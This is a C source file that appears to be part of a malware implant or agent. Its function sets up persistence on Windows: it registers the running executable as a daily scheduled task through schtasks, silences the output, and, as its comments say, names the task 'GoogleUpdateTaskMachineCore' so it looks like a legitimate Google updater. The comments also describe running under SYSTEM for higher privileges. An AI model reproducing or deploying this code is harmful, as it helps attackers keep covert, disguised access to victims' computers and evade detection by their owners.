// scheduled_task.c – Persistência via tarefa agendada (schtasks wrapper)
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include "../../utils/logger.h"

void Persist_ScheduledTask() {
    // 1. Get current path of executable
    char szPath[MAX_PATH];
    if (GetModuleFileNameA(NULL, szPath, MAX_PATH) == 0) return;

    // 2. Build command string
    // schtasks /create /tn "GoogleUpdateTaskMachineCore" /tr "C:\Path\To\Agent.exe" /sc daily /st 09:00 /ru SYSTEM /f
    // Using SYSTEM ensures high privileges if run as admin. User level otherwise.
    
    char cmd[1024];
    // We use a legitimate sounding name.
    const char* taskName = "GoogleUpdateTaskMachineCore"; 
    
    // Check if task exists first?
    // schtasks /query /tn ...
    
    // Create/Update task
    // Note: /f forces overwrite
    snprintf(cmd, sizeof(cmd), "schtasks /create /tn \"%s\" /tr \"%s\" /sc daily /st 09:00 /f >nul 2>&1", taskName, szPath);
    
    // 3. Execute
    int result = system(cmd);
    
    if (result == 0) {
        Log("Persistence: Scheduled Task created successfully");
    } else {
        Log("Persistence: Failed to create Scheduled Task");
    }
}
